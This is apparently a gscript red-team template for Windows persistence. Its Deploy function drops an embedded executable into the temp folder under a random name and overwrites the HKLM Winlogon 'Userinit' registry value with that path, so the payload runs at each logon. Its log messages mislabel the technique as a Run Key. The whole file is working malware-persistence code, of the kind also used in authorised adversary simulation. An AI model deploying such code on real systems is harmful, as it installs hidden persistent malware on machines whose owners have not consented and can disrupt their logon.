// Example gscript template
// Title: User Init Persistence
// Author: ahhh
// Purpose: User Init Persistence
// Gscript version: 1.0.0
// ATT&CK: 

//priority:90
//timeout:150

//go_import:os as os
//go_import:github.com/gen0cide/gscript/x/windows as windows

//import:/private/tmp/example.exe

function Deploy() {
    console.log("starting execution of Run Key Persistence");
    // Prep the sample
    var example = GetAssetAsBytes("example.exe");
    var temppath = os.TempDir();
    var naming = G.rand.GetAlphaString(5);
    naming = naming.toLowerCase();
    var fullpath = temppath+"\\"+naming+".exe";
  
    // Drop the sample
    console.log("file name: "+ fullpath);
    errors = G.file.WriteFileFromBytes(fullpath, example[0]);
    console.log("errors: "+errors);
    
    // Persist the sample
    windows.AddRegKeyString("LOCAL_MACHINE", "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "Userinit", fullpath);
    console.log("Adding a reg key for current user run");
    
    // Execute the sample
    //var running = G.exec.ExecuteCommandAsync("fullpath", [""]);
    //console.log("executed the example binary, errors: " + Dump(running[1]));
    console.log("done, deployed binary with run key persistence");
    return true;
  }
  